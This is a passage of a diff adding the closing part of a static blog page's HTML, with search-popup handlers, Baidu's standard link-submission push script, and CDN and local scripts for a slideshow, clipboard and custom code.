+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+<!-- 图片轮播js文件cdn -->
+<script src="https://cdn.bootcss.com/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+
+<!-- 剪贴板js文件 -->
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>
+
+<script>
+
+<!-- 头像挂件及自动刷新 -->
+
+
+</script>
+
+<!-- 自定义的js文件 -->
+<script type="text/javascript" src="/js/src/custom.js"></script>
+</body>
+</html>
